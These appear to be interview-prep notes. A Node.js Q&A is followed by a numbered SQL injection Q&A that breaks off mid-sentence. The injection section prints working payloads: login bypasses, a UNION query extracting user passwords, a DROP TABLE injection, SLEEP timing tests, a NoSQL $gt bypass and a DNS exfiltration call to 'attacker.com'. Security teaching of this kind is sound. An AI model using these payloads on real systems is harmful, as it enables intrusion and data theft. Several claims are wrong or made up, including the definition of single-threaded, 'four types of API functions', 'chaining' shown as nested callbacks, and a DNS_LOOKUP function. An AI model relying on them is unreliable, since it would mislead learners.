**Node Js**
- A. Node Js is a single-threaded, non-blocking, asynchronous programming language that is used to develop server-side applications. It is an open-source, cross-platform runtime environment that is used to execute JavaScript code on the server-side. Node Js is built on Chrome's V8 JavaScript engine. 


 **What is meant by single-threaded?**
- Single-threaded means that Node Js can handle only one request at a time.
- It uses a single thread to handle all the requests. 

**How does Node Js handle multiple requests?**
- Node Js uses an event-driven, non-blocking I/O model to handle multiple requests.
- It uses an event loop to handle multiple requests.
- The event loop is a mechanism that allows Node Js to handle multiple requests without blocking the execution of the program.
- When a request is received, Node Js adds it to the event loop and continues to process other requests.
- When the request is completed, Node Js sends the response back to the client.

**what is mean by  event loop in Node Js?**
- The event loop is a mechanism that allows Node Js to handle multiple requests without blocking the execution of the program.
- It is a loop that continuously checks for new events and executes the corresponding callback functions.
- The event loop is responsible for handling I/O operations, timers, and other asynchronous operations in Node Js.
example of event loop in Node Js:
```javascript
setInterval(() => {
  console.log('Hello World');
}, 1000);
```
- In this example, the setInterval function is used to print 'Hello World' every second.
- The event loop continuously checks for new events and executes the callback function every second.

**What is meant by non-blocking I/O?**
- Non-blocking I/O means that Node Js does not wait for I/O operations to complete before moving on to the next operation.
- It allows Node Js to handle multiple requests simultaneously without blocking the execution of the program.
- Node Js uses callbacks and promises to handle asynchronous operations.


**What is meant by asynchronous programming?**
- Asynchronous programming means that Node Js can execute multiple operations simultaneously without blocking the execution of the program.
- It allows Node Js to handle I/O operations, timers, and other asynchronous operations without waiting for them to complete.
- Asynchronous programming is achieved using callbacks, promises, and async/await in Node Js.

**What is the difference between synchronous and asynchronous programming?**
- Synchronous programming means that the program executes one operation at a time in a sequential order.
- Asynchronous programming means that the program can execute multiple operations simultaneously without waiting for them to complete.
- Synchronous programming blocks the execution of the program until the operation is completed.
- Asynchronous programming allows the program to continue executing other operations while waiting for the asynchronous operation to complete.

**What are the advantages of Node Js?**
- Fast execution: Node Js is built on Chrome's V8 JavaScript engine, which compiles JavaScript code into machine code, making it faster than other programming languages.
- Non-blocking I/O: Node Js uses an event-driven, non-blocking I/O model to handle multiple requests simultaneously without blocking the execution of the program.
- Scalability: Node Js is highly scalable and can handle a large number of requests with minimal resources.
- Large ecosystem: Node Js has a large ecosystem of libraries and frameworks that can be used to build server-side applications.
- Cross-platform: Node Js is a cross-platform runtime environment that can run on Windows, macOS, and Linux.

**How to handle concurrency in Node Js?**
- Concurrency means that multiple requests are being processed simultaneously.
- Node Js uses an event-driven, non-blocking I/O model to handle concurrency.
- It uses the event loop to handle multiple requests without blocking the execution of the program.

**use of crypto module in Node Js?**
- The crypto module in Node Js is used to provide cryptographic functionality.
- It provides a set of cryptographic functions that can be used to encrypt and decrypt data, generate hashes, and create digital signatures.
- The crypto module is used to secure data and protect it from unauthorized access.

**Other then JWT what can be used for authentication in Node Js?**
- Other than JWT, session-based authentication can be used for authentication in Node Js.
- Session-based authentication uses a session ID to authenticate users.
- When a user logs in, a session ID is generated and stored in a session store.
- The session ID is sent to the client, and the client sends the session ID with each request.

**How to limit the number of requests from same IP in Node Js?**
- To limit the number of requests from the same IP in Node Js, you can use the rate-limiting middleware.
- The rate-limiting middleware can be used to limit the number of requests from the same IP address within a specified time frame.
- The rate-limiting middleware can be configured to limit the number of requests per IP address, per route, or per application.
```javascript
import rateLimit from 'express-rate-limit';

export const rateLimiterUsingThirdParty = rateLimit({
  windowMs: 24 * 60 * 60 * 1000, // 24 hrs in milliseconds
  max: 100,
  message: 'You have exceeded the 100 requests in 24 hrs limit!', 
  standardHeaders: true,
  legacyHeaders: false,
});
export { rateLimiterUsingThirdParty } from './rateLimiter';
app.use(rateLimiterUsingThirdParty)
```

**How can you avoid callback hells?**
- Callback hell is a situation where multiple nested callbacks are used in a program, making the code difficult to read and maintain.
example of callback hell:
```javascript
fs.readFile('file1.txt', (err, data) => {
  if (err) {
    console.error(err);
  } else {
    fs.readFile('file2.txt', (err, data) => {
      if (err) {
        console.error(err);
      } else {
        fs.readFile('file3.txt', (err, data) => {
          if (err) {
            console.error(err);
          } else {
            console.log(data);
          }
        });
      }
    });
  }
});
```

- To avoid callback hell, you can use promises or async/await in Node Js.
example of using promises:

**When are background or worker processes useful?**
- Background or worker processes are useful when you need to perform long-running or CPU-intensive tasks in Node Js.
- like RabbitMQ, Redis, and ZeroMQ can be used to implement background or worker processes in Node Js. to handle tasks such as sending emails, processing images, or generating reports.


**Name the types of API functions in Node?**
- There are four types of API functions in Node Js:
1. Asynchronous, non-blocking functions: These functions do not block the execution of the program and return immediately.
2. Synchronous, blocking functions: These functions block the execution of the program until the operation is completed.
3. Asynchronous, blocking functions: These functions block the execution of the program but return immediately.
4. Synchronous, non-blocking functions: These functions do not block the execution of the program but return immediately.


**Explain chaining in Nodejs?**
- Chaining in Node Js is a technique used to execute multiple asynchronous operations in a sequential order.
- It allows you to chain multiple asynchronous operations together and execute them one after the other.
```javascript
const fs = require('fs');

fs.readFile('file1.txt', 'utf8', (err, data) => {
  if (err) {
    console.error(err);
  } else {
    console.log(data);
    fs.readFile('file2.txt', 'utf8', (err, data) => {
      if (err) {
        console.error(err);
      } else {
        console.log(data);
      }
    });
  }
});
```

### Basic SQL Injection Concepts (1-20)
1. What is SQL injection?
   - SQL injection is a type of cyber attack where malicious SQL statements are inserted into an input field, allowing attackers to manipulate the database backend.
2. How can SQL injection be prevented?
   - Using parameterized queries or prepared statements can prevent SQL injection by separating SQL code from user input.
3. What are the dangers of SQL injection attacks?
   - SQL injection attacks can lead to data loss, unauthorized access to sensitive information, and potential damage to the database structure.
4. Provide an example of a simple SQL injection attack.
   - Example: Suppose an attacker enters `' OR 1=1; --` into a login form's username field to bypass authentication.
5. How do you identify and test for SQL injection vulnerabilities?
   - By inputting special characters or SQL syntax into input fields and observing the application's response, you can test for SQL injection vulnerabilities.
6. Explain the role of sanitization and validation in preventing SQL injection.
   - Sanitization removes or escapes potentially harmful characters from user input, while validation checks input against predefined rules to ensure it's safe for processing.
7. What are the common methods used by attackers in SQL injection attacks?
   - Attackers often use techniques like union-based injection, error-based injection, blind injection, and time-based injection to exploit SQL vulnerabilities.
8. How do you securely handle user input in SQL queries?
   - By using parameterized queries or prepared statements, you can safely include user input in SQL queries without risking SQL injection vulnerabilities.
9. What are the consequences of a successful SQL injection attack?
   - Consequences include data leakage, unauthorized access, data manipulation, and potentially severe damage to the database and application.
10. How do you prevent SQL injection in dynamic SQL queries?
    - By using stored procedures or ORM frameworks, you can reduce the risk of SQL injection in dynamic SQL queries.

### Intermediate SQL Injection Techniques (21-40)
21. What is a blind SQL injection attack?
    - A blind SQL injection attack involves exploiting vulnerabilities without directly seeing the results, often through boolean-based or time-based techniques.
22. Provide an example of a boolean-based blind SQL injection attack.
    - Example: `' OR 1=1; --` returns true, while `' OR 1=2; --` returns false, helping attackers infer database structures.
23. What is an error-based SQL injection attack?
    - An error-based SQL injection attack leverages error messages returned by the database to extract information or manipulate the query.
24. Provide an example of an error-based SQL injection attack.
    - Example: Injecting `' OR 1=1; DROP TABLE users; --` might trigger an error message revealing the database structure or execute a destructive command.
25. What is a union-based SQL injection attack?
    - A union-based SQL injection attack combines multiple SQL queries using the UNION keyword to extract data from different tables.
26. Provide an example of a union-based SQL injection attack.
    - Example: Injecting `' UNION SELECT username, password FROM users; --` can retrieve user credentials from the 'users' table.
27. What is time-based SQL injection?
    - Time-based SQL injection involves delaying responses to extract information based on database response times.
28. Provide an example of a time-based SQL injection attack.
    - Example: Injecting `' OR IF(1=1, SLEEP(5), 0); --` can delay the response if the condition is true, indicating successful injection.
29. How do you exploit SQL injection vulnerabilities in numeric input fields?
    - By injecting mathematical operations or logical conditions, attackers can exploit vulnerabilities in numeric input fields.
30. How do you mitigate SQL injection vulnerabilities in stored procedures?
    - Use parameterized stored procedures with input validation and access controls to mitigate SQL injection vulnerabilities in stored procedures.

### Advanced SQL Injection Techniques (41-60)
41. What is out-of-band (OOB) SQL injection?
    - Out-of-band SQL injection involves leveraging data exfiltration or command execution through alternative communication channels.
42. Provide an example of out-of-band SQL injection using DNS exfiltration.
    - Example: Injecting `' OR DNS_LOOKUP('attacker.com'); --` can trigger DNS requests to the attacker's domain for data exfiltration.
43. How do you perform SQL injection attacks on NoSQL databases?
    - By injecting NoSQL-specific syntax or commands, attackers can exploit vulnerabilities in NoSQL databases.
44. Provide an example of a NoSQL injection attack.
    - Example: Injecting `{"$gt": ""}` in a MongoDB query can bypass authentication checks due to the $gt (greater than) operator.
45. What is second-order SQL injection?
    - Second-order SQL injection involves injecting malicious code into the application's data storage, which is later executed in a different context.
46. Provide an example of a second-order SQL injection attack.
    - Example: Attacker injects malicious code into a comment field, which is stored in the database and later executed in a different context, such as when the comment is displayed.
47. What are stored procedure injection attacks?
    - Stored procedure injection attacks involve manipulating or executing stored procedures within the database to exploit vulnerabilities.
48. Provide an example of a stored procedure injection attack.
    - Example: Injecting `'; EXEC sp_executesql N'SELECT * FROM users WHERE username = ''admin''; --` can execute a SQL query within a stored procedure.
49. How do you perform SQL injection attacks on XML-based databases?
    - By injecting XPath queries or XML-specific syntax, attackers can exploit vulnerabilities in XML-based databases.
50. Provide an example of an XML injection attack.
    - Example: Injecting `'; FOR $i IN doc("users.xml")//user RETURN $i; --` in an XPath query can retrieve data from an XML database.

### SQL Injection Prevention and Mitigation (61-80)
61. What are some best practices for preventing SQL injection in web applications?
    - Use parameterized queries, input validation, and output encoding, implement least privilege principle, and regularly update and patch software.
62. How do you implement input validation to prevent SQL injection?
    - Validate input against expected data types, lengths, and patterns, and reject inputs that don't meet validation criteria.
63. How do you sanitize user input to prevent SQL injection?
    - Use input sanitization techniques like escaping special characters, using whitelists, or using libraries with built-in sanitization functions.
64. How do you implement stored procedures or prepared statements to prevent SQL injection?
    - Use stored procedures with parameterized inputs or prepared statements with placeholders to separate SQL code from user input.
65. How do you secure database connections and credentials to prevent SQL injection?
    - Use encrypted connections (SSL/TLS), secure credential storage (environment variables or secure vaults), and limit database user privileges.
66. How do you perform security testing and code reviews to detect SQL injection vulnerabilities?
    - Conduct security testing using tools like SQLMap, perform code reviews to identify vulnerable code, and use static analysis tools for automated vulnerability scanning.
67. What are some common mistakes that lead to SQL injection vulnerabilities?
    - Concatenating user input directly into SQL queries, using outdated or insecure database
